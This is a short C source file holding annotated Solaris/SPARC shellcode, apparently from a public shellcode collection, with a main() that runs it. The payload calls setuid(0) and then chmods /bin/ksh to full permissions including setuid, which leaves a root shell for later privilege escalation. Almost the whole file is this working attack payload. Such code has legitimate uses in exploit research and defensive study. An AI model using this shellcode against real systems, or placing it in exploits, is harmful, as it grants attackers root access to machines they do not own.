/*
 * sparc_solaris_chmod.c - Solaris/SPARC chmod() shellcode
 * Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Solaris/SPARC setuid/chmod/exit shellcode.
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
 */

char sc[] = /* Solaris/SPARC chmod() shellcode (12 + 32 + 20 = 64 bytes) */

/* setuid(0) */
"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
"\x82\x10\x20\x17"	/* mov  0x17, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/

/* chmod("/bin/ksh", 037777777777) */
"\x92\x20\x20\x01"	/* sub  %g0, 1, %o1		*/
"\x20\xbf\xff\xff"	/* bn,a <sc + 12>		*/
"\x20\xbf\xff\xff"	/* bn,a <sc + 16>		*/
"\x7f\xff\xff\xff"	/* call <sc + 20>		*/
"\x90\x03\xe0\x20"	/* add  %o7, 0x20, %o0		*/
"\xc0\x22\x20\x08"	/* clr  [ %o0 + 8 ]		*/
"\x82\x10\x20\x0f"	/* mov  0xf, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/

/* exit(0) */
"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
"\x82\x10\x20\x01"	/* mov  1, %g1			*/
"\x91\xd0\x20\x08"	/* ta   8			*/
"/bin/ksh";

void main()
{
	void (*f)() = (void *)sc;
	f();
}